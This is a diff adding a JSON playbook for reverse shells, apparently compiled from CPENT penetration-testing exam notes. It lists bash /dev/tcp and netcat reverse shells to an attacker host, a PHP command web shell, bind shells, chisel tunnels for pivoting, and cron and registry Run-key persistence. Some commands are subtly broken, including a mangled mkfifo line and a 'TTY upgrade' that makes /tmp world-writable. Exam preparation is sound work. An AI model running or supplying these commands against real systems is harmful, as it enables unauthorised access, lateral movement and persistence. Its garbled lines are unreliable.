@@ -1,0 +1,114 @@
+{
+  "id": "reverse-shells-argha-dey-methodology",
+  "zone": "exploitation-frameworks",
+  "name": "Argha Dey Reverse Shells & Stabilization Playbook",
+  "source": "Argha Dey CPENT Notes (94% scorer)",
+  "description": "Comprehensive reverse shell generation, delivery, and stabilization guide compiled from the Pivoting & Tunneling, OS Command Injection, and Linux Privilege Escalation notes.",
+  "examHabits": [
+    "Test reverse shell connectivity with a simple nc listener BEFORE running the payload",
+    "Always use rlwrap with nc -lvnp to have proper shell history",
+    "Python pty.spawn for interactive shell; Ctrl+Z + stty raw -echo + fg for terminal upgrade",
+    "Have socat backup ready — if one-liners fail, use a bind shell via socat",
+    "Document local IP and port on your attack machine before shell delivery"
+  ],
+  "quickRef": "rlwrap nc -lvnp 4444 | grep -a 'connect to' | ...",
+  "steps": [
+    {
+      "phase": "Phase 1 - Shell Selection (Choose by Target)",
+      "tools": ["bash", "python", "php", "perl", "ruby", "ncat", "socat"],
+      "decisionPoints": [
+        {
+          "condition": "Linux target, nc/bash available",
+          "action": "bash -c 'bash -i >& /dev/tcp/<attacker>/4444 0>&1'",
+          "fallback": "Use python: python3 -c 'import socket,subprocess,os;...'"
+        },
+        {
+          "condition": "Windows target, PowerShell available",
+          "action": "PowerShell IEX one-liner reverse shell (see Nishang/Invoke-PowerShellTcp)",
+          "fallback": "Use Nishang or Invoke-PowerShellTcp one-liner"
+        },
+        {
+          "condition": "PHP target (web shell upload)",
+          "action": "<?php system($_GET['cmd']); ?>",
+          "fallback": "Use weevely or b374k for more features"
+        },
+        {
+          "condition": "No standard shells work (filtered/blocked)",
+          "action": "mkfifo /tmp/f; nc &lt;attacker&gt; 4444 0&lt;/tmp/f 2>&1; cat /tmp/f | /bin/sh -c 'cat &gt;/tmp/f' >/tmp/f 2>&1; nc &lt;attacker&gt; 4444",
+          "fallback": "Use a reverse HTTP/HTTPS tunnel with chisel or ligolo"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 2 - Bind Shell Alternatives",
+      "tools": ["ncat", "socat", "python", "perl"],
+      "decisionPoints": [
+        {
+          "condition": "Reverse shell is blocked (egress filtering)",
+          "action": "Try bind shell: nc -l -p 4444 -e /bin/bash (then connect from attacker)",
+          "fallback": "socat: socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 3 - Shell Stabilization",
+      "tools": ["python", "socat"],
+      "decisionPoints": [
+        {
+          "condition": "Got a basic shell, need interactive terminal",
+          "action": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+          "fallback": "perl: perl -e 'exec(\"/bin/bash\")'"
+        },
+        {
+          "condition": "Shell works but terminal is messy",
+          "action": "Ctrl+Z → stty raw -echo → fg → export TERM=xterm",
+          "fallback": "Use socat for full terminal emulation"
+        },
+        {
+          "condition": "Need to upgrade a dumb shell to full TTY",
+          "action": "python -c 'import pty,os,os; pty.spawn(\"/bin/bash\"); os.chmod(\"/tmp\",0o777)'",
+          "fallback": "Upload a precompiled binary or use awk/sed for TTY allocation"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 4 - Tunneling Through Compromised Host",
+      "tools": ["chisel", "ligolo", "sshuttle", "proxychains"],
+      "techniques": ["socks-proxy", "port-forwarding"],
+      "decisionPoints": [
+        {
+          "condition": "Need to reach internal network from compromised host",
+          "action": "Reverse SOCKS: ./chisel client <attacker>:8000 R:socks — then proxychains scan internal",
+          "fallback": "ligolo: ligolo -relay <attacker>:5100 — then run internal nmap through the tunnel"
+        },
+        {
+          "condition": "SSH access to pivot",
+          "action": "ssh -D 1080 <user>@<pivot> (dynamic port forward) — then proxychains4 curl internal",
+          "fallback": "sshuttle -r <user>:<pivot> <internal-subnet>/24 for transparent routing"
+        },
+        {
+          "condition": "Only have a web shell",
+          "action": "Upload chisel/ligolo binary to target — run reverse proxy",
+          "fallback": "Use reGeorg or tunna for HTTP-based tunneling through the webshell"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 5 - Persistence via Reverse Shells",
+      "tools": ["cron", "systemd", "at", "screen", "tmux"],
+      "techniques": ["persistence-cron"],
+      "decisionPoints": [
+        {
+          "condition": "Need persistent access on Linux",
+          "action": "echo '* * * * * /tmp/reverse_shell.sh' | crontab -",
+          "fallback": "Create systemd service in /etc/systemd/system/ or user systemd in ~/.config/systemd/"
+        },
+        {
+          "condition": "Windows persistence",
+          "action": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MyShell /t REG_SZ /d 'C:\\shell.exe'",
+          "fallback": "Use schtasks for scheduled execution"
+        }
+      ]
+    }
+  ]
+}
